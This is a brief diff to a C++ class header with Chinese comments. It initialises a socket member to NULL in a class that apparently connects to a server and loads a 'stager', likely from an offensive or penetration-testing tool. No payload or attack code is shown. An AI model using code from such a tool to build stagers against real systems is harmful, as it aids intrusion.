@@ -31,7 +31,7 @@ public:
 	BOOL ConnectServer(std::string host, USHORT port);
 	VOID GoodCooolis();
 private:
-	SOCKET socks; // 套接字
+	SOCKET socks = NULL; // 套接字
 	stager* getStager;
 	HANDLE hThread = NULL; // 线程句柄
 	
